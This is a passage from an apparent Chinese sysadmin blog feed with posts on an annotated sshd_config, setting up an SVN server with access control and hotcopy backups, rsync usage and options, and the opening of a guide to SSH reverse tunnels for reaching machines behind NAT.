class="line">Protocol 2,1   #指定支持的SSH协议的版本号。'1'和'2'表示仅仅支持SSH-1和SSH-2协议。</span><br><span class="line"><span class="meta">#</span>"2,1"表示同时支持SSH-1和SSH-2协议。#</span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_dsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ed25519_key    #HostKey是主机私钥文件的存放位置; </span><br><span class="line"><span class="meta">#</span>SSH-1默认是 /etc/ssh/ssh_host_key 。SSH-2默认是 /etc/ssh/ssh_host_rsa_key和</span><br><span class="line"><span class="meta">#</span>/etc/ssh/ssh_host_dsa_key 。一台主机可以拥有多个不同的私钥。"rsa1"仅用于SSH-1，</span><br><span class="line"><span class="meta">#</span>"dsa"和"rsa"仅用于SSH-2。</span><br><span class="line">UsePrivilegeSeparation yes     #是否通过创建非特权子进程处理接入请求的方法来进行权</span><br><span class="line"><span class="meta">#</span>限分 离。默认值是"yes"。 认证成功后，将以该认证用户的身份创另一个子进程。这样做的目的是</span><br><span class="line"><span class="meta">#</span>为了防止通过有缺陷的子进程提升权限，从而使系统更加安全。</span><br><span class="line">KeyRegenerationInterval 3600   #在SSH-1协议下，短命的服务器密钥将以此指令设置的时</span><br><span class="line"><span class="meta">#</span>间为周期(秒)，不断重新生成；这个机制可以尽量减小密钥丢失或者黑客攻击造成的损失。设为 0 </span><br><span class="line"><span class="meta">#</span>表示永不重新生成为 3600(秒)。</span><br><span class="line">ServerKeyBits 1024    #指定服务器密钥的位数</span><br><span class="line">SyslogFacility AUTH   #指定 将日志消息通过哪个日志子系统(facility)发送。有效值是：</span><br><span class="line"><span class="meta">#</span>DAEMON, USER, AUTH(默认), LOCAL0, LOCAL1, LOCAL2, LOCAL3,LOCAL4, LOCAL5, </span><br><span class="line"><span class="meta">#</span>LOCAL6, LOCAL7</span><br><span class="line">LogLevel INFO     #指定日志等级(详细程度)。可用值如下:QUIET, FATAL, ERROR, INFO</span><br><span class="line"><span class="meta">#</span>(默认), VERBOSE, DEBUG, DEBUG1, DEBUG2, DEBUG3,DEBUG 与 DEBUG1 等价；DEBUG2</span><br><span class="line"><span class="meta">#</span> 和 DEBUG3 则分别指定了更详细、更罗嗦的日志输出。比 DEBUG 更详细的日志可能会泄漏用户</span><br><span class="line"><span class="meta">#</span> 的敏感信息，因此反对使用。</span><br><span class="line">LoginGraceTime 120  #限制用户必须在指定的时限(单位秒)内认证成功，0 表示无限制。默认</span><br><span class="line"><span class="meta">#</span>值是 120 秒;如果用户不能成功登录，在用户切断连接之前服务器需要等待120秒。</span><br><span class="line">PermitRootLogin yes  #是否允许 root 登录。可用值如下："yes"(默认) 表示允许。</span><br><span class="line"><span class="meta">#</span>"no"表示禁止。"without-password"表示禁止使用密码认证登录。"forced-commands-only"</span><br><span class="line"><span class="meta">#</span>表示只有在指定了 command 选项的情况下才允许使用公钥认证登录，同时其它认证方法全部被禁止。</span><br><span class="line"><span class="meta">#</span>这个值常用于做远程备份之类的事情。</span><br><span class="line">StrictModes yes       #指定是否要求 sshd(8) 在接受连接请求前对用户主目录和相关的配</span><br><span class="line"><span class="meta">#</span>置文件 进行宿主和权限检查。强烈建议使用默认值"yes"来预防可能出现的低级错误。</span><br><span class="line">RSAAuthentication yes  #是否允许使用纯 RSA 公钥认证。仅用于SSH-1。默认值是"yes"。</span><br><span class="line">PubkeyAuthentication yes  #是否允许公钥认证。仅可以用于SSH-2。默认值为"yes"。</span><br><span class="line">IgnoreRhosts yes    #是否取消使用 ~/.ssh/.rhosts 来做为认证。推荐设为yes。</span><br><span class="line">RhostsRSAAuthentication no  #这个选项是专门给 version 1 用的，使用 rhosts 档案在 　　　　　　　　　　　　　    </span><br><span class="line"><span class="meta">#</span>/etc/hosts.equiv配合 RSA 演算方式来进行认证！推荐no。</span><br><span class="line">HostbasedAuthentication no    #这个与上面的项目类似，不过是给 version 2 使用的</span><br><span class="line">IgnoreUserKnownHosts no          #是否在 RhostsRSAAuthentication 或 </span><br><span class="line"><span class="meta">#</span>HostbasedAuthentication 过程中忽略用户的 ~/.ssh/known_hosts 文件。默认值是"no"。</span><br><span class="line"><span class="meta">#</span>为了提高安全性，可以设为"yes"。</span><br><span class="line">PermitEmptyPasswords no         #是否允许密码为空的用户远程登录。默认为"no"。</span><br><span class="line">ChallengeResponseAuthentication no   #是否允许质疑-应答(challenge-response)认         </span><br><span class="line"><span class="meta">#</span>证。默认值是"yes"，所有 login.conf中允许的认证方式都被支持。</span><br><span class="line">PasswordAuthentication yes      # 是否允许使用基于密码的认证。默认为"yes"。</span><br><span class="line">KerberosAuthentication no    #是否要求用户为 PasswordAuthentication 提供的密码</span><br><span class="line"><span class="meta">#</span>必须通 过 Kerberos KDC 认证，也就是是否使用Kerberos认证。使用Kerberos认证，服务器</span><br><span class="line"><span class="meta">#</span>需要一个可以校验 KDC identity 的 Kerberos servtab 。默认值是"no"。</span><br><span class="line">KerberosGetAFSToken no       #如果使用了 AFS 并且该用户有一个 Kerberos 5 TGT，</span><br><span class="line"><span class="meta">#</span>那么开   启该指令后,将会在访问用户的家目录前尝试获取一个 AFS  token 。默认为"no"。</span><br><span class="line">KerberosOrLocalPasswd yes   #如果 Kerberos 密码认证失败，那么该密码还将要通过其它</span><br><span class="line"><span class="meta">#</span>的 认证机制(比如 /etc/passwd)。默认值为"yes"。</span><br><span class="line">KerberosTicketCleanup yes    #是否在用户退出登录后自动销毁用户的 ticket 。默认</span><br><span class="line"><span class="meta">#</span>"yes"。</span><br><span class="line">GSSAPIAuthentication no      #是否允许使用基于 GSSAPI 的用户认证。默认值为"no"。</span><br><span class="line"><span class="meta">#</span>仅用 于SSH-2。</span><br><span class="line">GSSAPICleanupCredentials yes   #是否在用户退出登录后自动销毁用户凭证缓存。默认值      </span><br><span class="line"><span class="meta">#</span>是"yes"。仅用于SSH-2。</span><br><span class="line">X11Forwarding no    #是否允许进行 X11 转发。默认值是"no"，设为"yes"表示允许。如果</span><br><span class="line"><span class="meta">#</span>允许X11转发并且sshd代理的显示区被配置为在含有通配符的地址(X11UseLocalhost)上监听。</span><br><span class="line"><span class="meta">#</span>那么将可能有额外的信息被泄漏。由于使用X11转发的可能带来的风险，此指令默认值为"no"。需</span><br><span class="line"><span class="meta">#</span>要注意的是，禁止X11转发并不能禁止用户转发X11通信，因为用户可以安装他们自己的转发器。如</span><br><span class="line"><span class="meta">#</span>果启用了 UseLogin ，那么X11转发将被自动禁止。</span><br><span class="line">X11DisplayOffset 10    #指定X11 转发的第一个可用的显示区(display)数字。默认值                   </span><br><span class="line"><span class="meta">#</span>是 10 。这个可以用于防止 sshd 占用了真实的 X11 服务器显示区，从而发生混淆。</span><br><span class="line">PrintMotd no                #登入后是否显示出一些信息呢？例如上次登入的时间、地点等</span><br><span class="line"><span class="meta">#</span>等，预设是 yes ，但是，如果为了安全，可以考虑改为 no ！</span><br><span class="line">PrintLastLog yes           #指定是否显示最后一位用户的登录时间。默认值是"yes"</span><br><span class="line">TCPKeepAlive yes       #指定系统是否向客户端发送 TCP keepalive 消息。默认值是"yes"</span><br><span class="line"><span class="meta">#</span>。这种消息可以检测到死连接、连接不当关闭、客户端崩溃等异常。可以设为"no"关闭这个特性。</span><br><span class="line">UseLogin no               #是否在交互式会话的登录过程中使用 login。默认值是"no"。</span><br><span class="line"><span class="meta">#</span>如果开启此指令，那么 X11Forwarding 将会被禁止，因为 login 不知道如何处理 xauth </span><br><span class="line"><span class="meta">#</span>cookies 。需要注意的是，login是禁止用于远程执行命令的。如果指定了 </span><br><span class="line"><span class="meta">#</span>UsePrivilegeSeparation ，那么它将在认证完成后被禁用。</span><br><span class="line">MaxStartups 10        #最大允许保持多少个未认证的连接。默认值是 10 。到达限制后，</span><br><span class="line"><span class="meta">#</span>将不再接受新连接，除非先前的连接认证成功或超出 LoginGraceTime 的限制。</span><br><span class="line">MaxAuthTries 6     #指定每个连接最大允许的认证次数。默认值是 6 。如果失败认证的次数超</span><br><span class="line"><span class="meta">#</span>过这个数值的一半，连接将被强制断开，且会生成额外的失败日志消息。</span><br><span class="line">UseDNS no          #指定是否应该对远程主机名进行反向解析，以检查此主机名是否与其IP</span><br><span class="line"><span class="meta">#</span>地址真实对应。</span><br><span class="line">Banner /etc/issue.net   #将这个指令指定的文件中的内容在用户进行认证前显示给远程用户。</span><br><span class="line"><span class="meta">#</span>这个特性仅能用于SSH-2，默认什么内容也不显示。"none"表示禁用这个特性。</span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server   #配置一个外部子系统(例如，一个文件</span><br><span class="line"><span class="meta">#</span>传输守   护进程)。仅用于SSH-2协议。值是一个子系统的名字和对应的命令行(含选项和参数)。</span><br><span class="line">UsePAM yes     #是否使用PAM模块认证</span><br></pre></td></tr></table></figure><ul><li>解决SSH登陆缓慢<ul><li>编辑SSHD_CONFIG文件，将UseDNS改为no， 关闭GSSAPIAuthentication no</li><li>检查<code>/etc/hosts</code> 查看ip映射</li></ul></li><li>Server限制Ip登陆<ul><li><code>/etc/hosts.deny</code>  设置为 sshd: ALL: deny</li><li><code>/etc/hosts.allow</code>  设置ip访问： sshd : x.x.x.x : allow</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> SSH </category>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux-SVN部署</title>
      <link href="/2018/03/11/yunwei/Linux-SVN%E9%83%A8%E7%BD%B2/"/>
      <url>/2018/03/11/yunwei/Linux-SVN%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>​    SVN是Subversion的简称，是一个开放源代码的版本控制系统，相较于RCS、CVS，它采用了分支管理系统，它的设计目标就是取代CVS。互联网上很多版本控制服务已从CVS迁移到Subversion。说得简单一点SVN就是用于多个人共同开发同一个项目，共用资源的目的。</p><p>svn存储版本数据也有2种方式：</p><ul><li>BDB(一种事务安全型表类型)</li><li>FSFS(一种不需要数据库的存储系统)。</li></ul><p>因为BDB方式在服务器中断时，有可能锁住数据，所以还是FSFS方式更安全一点。</p><ul><li>SVN安装</li><li>authz访问控制权限</li><li>备份还原</li></ul><a id="more"></a><p><br></p><h3 id="搭建svn服务器"><a href="#搭建svn服务器" class="headerlink" title="搭建svn服务器"></a>搭建svn服务器</h3><ol><li><p>安装subversion软件</p><ul><li><p>Ubuntu/Debian</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install subversion</span><br></pre></td></tr></table></figure></li><li><p>Redhat/CentOS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install subversion</span><br></pre></td></tr></table></figure></li></ul></li><li><p>创建SVN仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svnadmin create /home/svn/repos   ##定义任何目录，前提有权限访问</span><br></pre></td></tr></table></figure></li><li><p>修改<code>/home/svn/repos/conf/svnserve.conf</code>‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#匿名访问的权限，可以是read,write,none,默认为read  </span><br><span class="line">anon-access = none </span><br><span class="line">认证用户的权限，可以是read,write,none,默认为write  </span><br><span class="line">auth-access = write </span><br><span class="line">#密码数据库的路径，去掉前面的#</span><br><span class="line">password-db = passwd </span><br><span class="line">#访问控制文件 仓库目录访问权限</span><br><span class="line">authz-db = authz</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>修改 <code>/home/svn/repos/conf/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[users]</span><br><span class="line">root = 123456   #添加用户 以及 密码</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>修改 <code>/home/svn/rpos/conf/authz</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[aliases]</span><br><span class="line"># joe = /C=XZ/ST=Dessert/L=Snake City/O=Snake Oil, Ltd./OU=Research Institute/CN=Joe Average</span><br><span class="line"></span><br><span class="line">[groups]</span><br><span class="line"># harry_and_sally = harry,sally</span><br><span class="line"># harry_sally_and_joe = harry,sally,&amp;joe</span><br><span class="line">FA = lg,lgl,wyh</span><br><span class="line"></span><br><span class="line">[repository:/]</span><br><span class="line">root = rw</span><br><span class="line">* = r </span><br><span class="line"></span><br><span class="line">[repository:/AA]</span><br><span class="line">root = rw</span><br><span class="line">wyh = rw</span><br><span class="line">lgl = rw</span><br><span class="line">* =</span><br><span class="line"></span><br><span class="line">[repository:/BB/AGV]</span><br><span class="line">root = rw</span><br><span class="line">wyh = r </span><br><span class="line">lg = r</span><br><span class="line">* = </span><br><span class="line"></span><br><span class="line">[repository:/BB/GG]</span><br><span class="line">root = rw</span><br><span class="line">lg = rw</span><br><span class="line">* =</span><br></pre></td></tr></table></figure><p>此时</p><ul><li><p>root对所有目录都有读写权限</p></li><li><p>lg 对repository 有读权限; 对 repostitory/AA 没有任何权限; 对repostitory/BB/AGV 有读权限; 对repostitory/BB/GG 有读写权限</p><p>依次可以类推;</p><p>  ​    </p></li></ul></li><li><p>启动Subversion服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svnserve -d -r /home/svn/   ## --listen-host x.x.x.x</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>停止Subversion服务器:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ killall -9 svnserve</span><br></pre></td></tr></table></figure><p><code>-d</code>表示在后台运行</p><p><code>-r</code>指定服务器的根服务</p><p>现在将可以直接使用 <code>svn://ip/repos</code> 访问</p></li></ol><h3 id="window客户端下载"><a href="#window客户端下载" class="headerlink" title="window客户端下载"></a>window客户端下载</h3><p><a href="https://pan.baidu.com/s/1KwLXydY7Jfp6D_otz5yMIQ" target="_blank" rel="noopener">window-svn客户端下载</a></p><h3 id="备份还原"><a href="#备份还原" class="headerlink" title="备份还原"></a>备份还原</h3><p>svn备份还原存在三种方式:</p><ul><li>dump</li><li>hotcopy</li><li>svnsync</li></ul><h4 id="dump方法"><a href="#dump方法" class="headerlink" title="dump方法"></a>dump方法</h4><h4 id="hotcopy-进行热备份和还原"><a href="#hotcopy-进行热备份和还原" class="headerlink" title="hotcopy 进行热备份和还原"></a>hotcopy 进行热备份和还原</h4><ul><li><p>备份方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ svnadmin hotcopy /var/svn/lius/ ~/hotcopy.bak   // 后面是要备份的路径, 是一个目录</span><br><span class="line">$ file ~/hotcopy.bak</span><br><span class="line">/root/hotcopy.bak: directory</span><br><span class="line">$ ls ~/hotcopy.bak</span><br><span class="line">conf  db  format  hooks  locks  README.txt</span><br></pre></td></tr></table></figure><p><code>--clean-logs</code>选项，是svnadmin执行热拷贝操作时，删除不用的Berkeley DB日志文件。 可以在任何时候运行这个命令得到一个版本库的安全拷贝，不管其它进程是否使用这个版本库。</p></li><li><p>还原:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ svnadmin hotcopy ~/hotcopy.bak /var/svn/hotsvn   ## 可以将被破坏的原有文件删除，重新还原为之前位置名字， 客户端即可实现同步;  即 rm- rf /var/svn/lius/ &amp;&amp; svnadmin hotcopy ~/hotcopy.bak /var/svn/lius/</span><br><span class="line">$ ls /var/svn/hotsvn</span><br><span class="line">conf  db  format  hooks  locks  README.txt</span><br><span class="line">$ killall svnserve</span><br><span class="line">$ svnserve -d -r /var/svn/</span><br></pre></td></tr></table></figure><p>​</p></li></ul><h3 id="authz-访问控制权限"><a href="#authz-访问控制权限" class="headerlink" title="authz 访问控制权限"></a>authz 访问控制权限</h3>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>rsync</title>
      <link href="/2018/03/11/commands/rsync/"/>
      <url>/2018/03/11/commands/rsync/</url>
      
        <content type="html"><![CDATA[<h4 id="rsync-介绍"><a href="#rsync-介绍" class="headerlink" title="rsync 介绍"></a>rsync 介绍</h4><p><a href="http://zh.wikipedia.org/zh-cn/Rsync" target="_blank" rel="noopener">rsync</a>是类unix系统下的数据镜像备份工具——remote sync。</p><p>rsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。</p><p>它的特性如下：</p><ul><li>可以镜像保存整个目录树和文件系统。</li><li>可以很容易做到保持原来文件的权限、时间、软硬链接等等。</li><li>无须特殊权限即可安装。</li><li>快速：第一次同步时 rsync 会复制全部内容，但在下一次只传输修改过的文件。rsync 在传输数据的过程中可以实行压缩及解压缩操作，因此可以使用更少的带宽。</li><li>安全：可以使用scp、ssh等方式来传输文件，当然也可以通过直接的socket连接。</li><li>支持匿名传输，以方便进行网站镜像。</li></ul><a id="more"></a><p><br></p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rsync [OPTION]... SRC DEST</span><br><span class="line">rsync [OPTION]... SRC [USER@]host:DEST</span><br><span class="line">rsync [OPTION]... [USER@]HOST:SRC DEST</span><br><span class="line">rsync [OPTION]... [USER@]HOST::SRC DEST</span><br><span class="line">rsync [OPTION]... SRC [USER@]HOST::DEST</span><br><span class="line">rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]</span><br></pre></td></tr></table></figure><p>对应于以上六种命令格式，rsync有六种不同的工作模式：</p><ol><li>拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号”:”分隔符时就启动这种工作模式。如：<code>rsync -a /data /backup</code></li><li>使用一个远程shell程序(如<a href="http://man.linuxde.net/rsh" target="_blank" rel="noopener">rsh</a>、<a href="http://man.linuxde.net/ssh" target="_blank" rel="noopener">ssh</a>)来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号”:”分隔符时启动该模式。如：<code>rsync -avz *.c foo:src</code></li><li>使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号”:”分隔符时启动该模式。如：<code>rsync -avz foo:src/bar /data</code></li><li>从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含”::”分隔符时启动该模式。如：<code>rsync -av root@192.168.78.192::www /databack</code></li><li>从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含”::”分隔符时启动该模式。如：<code>rsync -av /databack root@192.168.78.192::www</code></li><li>列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：<code>rsync -v rsync://192.168.78.192/www</code></li></ol><h4 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rsync main.c user-b@machB:/home/dir</span><br></pre></td></tr></table></figure><ol><li>只要目的端的文件内容和源端不一样，就会触发数据同步，rsync会确保两边的文件内容一样。</li><li>但rsync不会同步文件的”modify time”，凡是有数据同步的文件，目的端的文件的”modify time”总是会被修改为最新时间。</li><li>rsync不会太关注目的端文件的rwx权限，如果目的端没有此文件，那么权限会保持与源端一致；如果目的端有此文件，则权限不会随着源端变更。</li><li>只要rsync对源文件有读权限，且对目标文件有写权限，rsync就能确保文件同步和源端保持一致</li><li>rsync只能以登陆目的端的账号来创建文件，他没有能力保持目的端文件的属主和属组 与 源端一致。</li></ol><h4 id="参数选项"><a href="#参数选项" class="headerlink" title="参数选项"></a>参数选项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">-v, --verbose 详细模式输出。</span><br><span class="line">-q, --quiet 精简输出模式。</span><br><span class="line">-c, --checksum 打开校验开关，强制对文件传输进行校验。</span><br><span class="line">-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。</span><br><span class="line">-r, --recursive 对子目录以递归模式处理。 ##并对文件夹同步</span><br><span class="line">-R, --relative 使用相对路径信息。</span><br><span class="line">-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。</span><br><span class="line">--backup-dir 将备份文件(如~filename)存放在在目录下。</span><br><span class="line">-suffix=SUFFIX 定义备份文件前缀。</span><br><span class="line">-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。</span><br><span class="line">-l, --links 保留软链结。</span><br><span class="line">-L, --copy-links 想对待常规文件一样处理软链结。</span><br><span class="line">--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。</span><br><span class="line">--safe-links 忽略指向SRC路径目录树以外的链结。</span><br><span class="line">-H, --hard-links 保留硬链结。</span><br><span class="line">-p, --perms 保持文件权限。</span><br><span class="line">-o, --owner 保持文件属主信息。</span><br><span class="line">-g, --group 保持文件属组信息。</span><br><span class="line">-D, --devices 保持设备文件信息。</span><br><span class="line">-t, --times 保持文件时间信息。   ## 带有-t选项的rsync，同步前会先比对两侧文件的时间戳，不一致才会对比，但可能文件内容不同，时间戳一样。</span><br><span class="line">-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。</span><br><span class="line">-n, --dry-run现实哪些文件将被传输。</span><br><span class="line">-w, --whole-file 拷贝文件，不进行增量检测。</span><br><span class="line">-x, --one-file-system 不要跨越文件系统边界。</span><br><span class="line">-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。</span><br><span class="line">-e, --rsh=command 指定使用rsh、ssh方式进行数据同步。 ## 指定同步方式，进行安全传输;</span><br><span class="line">--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。</span><br><span class="line">-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。</span><br><span class="line">--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。</span><br><span class="line">--delete 删除那些DST中SRC没有的文件。</span><br><span class="line">--delete-excluded 同样删除接收端那些被该选项指定排除的文件。</span><br><span class="line">--delete-after 传输结束以后再删除。</span><br><span class="line">--ignore-errors 及时出现IO错误也进行删除。</span><br><span class="line">--max-delete=NUM 最多删除NUM个文件。</span><br><span class="line">--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。</span><br><span class="line">--force 强制删除目录，即使不为空。</span><br><span class="line">--numeric-ids 不将数字的用户和组id匹配为用户名和组名。</span><br><span class="line">--timeout=time ip超时时间，单位为秒。</span><br><span class="line">-I, --ignore-times 不跳过那些有同样的时间和长度的文件。 ## 配合-t使用，防止时间戳一致，但是内容不同文件</span><br><span class="line">--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。</span><br><span class="line">--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。</span><br><span class="line">-T --temp-dir=DIR 在DIR中创建临时文件。</span><br><span class="line">--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。</span><br><span class="line">-P 等同于 --partial。</span><br><span class="line">--progress 显示备份过程。</span><br><span class="line">-z, --compress 对备份的文件在传输时进行压缩处理。 </span><br><span class="line">--exclude=PATTERN 指定排除不需要传输的文件模式。</span><br><span class="line">--include=PATTERN 指定不排除而需要传输的文件模式。</span><br><span class="line">--exclude-from=FILE 排除FILE中指定模式的文件。</span><br><span class="line">--include-from=FILE 不排除FILE指定模式匹配的文件。</span><br><span class="line">--version 打印版本信息。</span><br><span class="line">--address 绑定到特定的地址。</span><br><span class="line">--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。</span><br><span class="line">--port=PORT 指定其他的rsync服务端口。</span><br><span class="line">--blocking-io 对远程shell使用阻塞IO。</span><br><span class="line">-stats 给出某些文件的传输状态。</span><br><span class="line">--progress 在传输时现实传输过程。</span><br><span class="line">--log-format=formAT 指定日志文件格式。</span><br><span class="line">--password-file=FILE 从FILE中得到密码。</span><br><span class="line">--bwlimit=KBPS 限制I/O带宽，KBytes per second。</span><br><span class="line">-h, --help 显示帮助信息。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 命令篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSH反向隧道进行内网穿透</title>
      <link href="/2018/03/10/commands/SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2018/03/10/commands/SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>​    假设机器A和B， A有公网IP， B位于NAT之后并无可用的端口转发，现在想由A主动向B发起SSH链接请求。 如遇B在NAT之后，无可用 <strong>公网IP + 端口</strong> 来组合使用，所以A无法穿透NAT。</p><table><thead><tr><th style="text-align:center">机器代号</th><th style="text-align:center">机器位置</th><th style="text-align:center">地址</th><th style="text-align:center">账户</th><th style="text-align:center">SSH/SSHD端口</th><th style="text-align:center">是否需要运行SSHD</th></tr></thead><tbody><tr><td style="text-align:center">A</td><td style="text-align:center">位于公网</td><td style="text-align:center">a.site</td><td style="text-align:center">user-a</td><td style="text-align:center">22</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">B</td><td style="text-align:center">位于NAT之后</td><td style="text-align:center">b.site</td><td style="text-align:center">user-b</td><td style="text-align:center">22</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">C</td><td style="text-align:center">位于NAT之后</td><td style="text-align:center">c.site</td><td style="text-align:center">user-c</td><td style="text-align:center">22</td><td style="text-align:center">否</td></tr></tbody></table><a id="more"></a><p><br></p><h4 id="SSH主要参数"><a href="#SSH主要参数" class="headerlink" title="SSH主要参数"></a>SSH主要参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec]</span><br><span class="line">           [-D [bind_address:]port] [-E log_file] [-e escape_char]</span><br><span class="line">           [-F configfile] [-I pkcs11] [-i identity_file]</span><br><span class="line">           [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec]</span><br><span class="line">           [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]</span><br><span class="line">           [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]</span><br><span class="line">           [user@]hostname [command]</span><br></pre></td></tr></table></figure><ul><li><p>-p    指定特定链接端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 